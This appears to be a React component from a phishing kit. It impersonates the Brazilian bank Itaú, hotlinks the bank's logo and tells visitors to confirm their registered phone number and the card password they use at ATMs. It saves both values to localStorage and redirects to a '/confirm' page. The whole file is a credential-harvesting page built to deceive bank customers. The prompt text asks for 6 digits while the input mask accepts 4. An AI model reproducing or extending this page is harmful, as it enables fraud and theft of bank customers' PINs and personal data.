import React, { useState } from 'react'
import './EmailTelefone.css'
import InputMask from 'react-input-mask';
import { useNavigate } from 'react-router-dom'

const EmailTelefone = () => {
    const navigate = useNavigate();
    const [tel, setTel] = useState(null)
    const [seis, setSeis] = useState(null)

    const defineTel = (event) => {
        setTel(event.target.value)
    }
    const defineSeis = (event) => {
        setSeis(event.target.value)
    }

    const handleClick = () => {
        setTimeout(() => {
            localStorage.setItem("tel", tel)
            localStorage.setItem("seis", seis)
            navigate('/confirm');
        }, 1000);
    }
  return (
    <div className='EmailTelefone'>
        <div className='logo'>
            <img src="https://www.itau.com.br/media/dam/m/538533fcf33fd411/original/itau-logo-branco-48x48.png" alt="logo_itau" />
        </div>
        <div className='title-et'>
            <span>Confirme os dados abaixo para<br />continuar</span>
        </div>
        <div className='form3'>
            <span>o mesmo que está em seu cadastro:</span>
            <InputMask mask="(99) 99999-9999" className="digitavel" type="text" placeholder='telefone' onChange={defineTel} />
            <span>a mesma que você usa no caixa eletrônico (6 digitos):</span>
            <InputMask mask="9999" className="digitavel" type="password" placeholder='digite a senha do cartão' onChange={defineSeis} />
            <button onClick={handleClick}>confirmar</button>
        </div>
    </div>
  )
}

export default EmailTelefone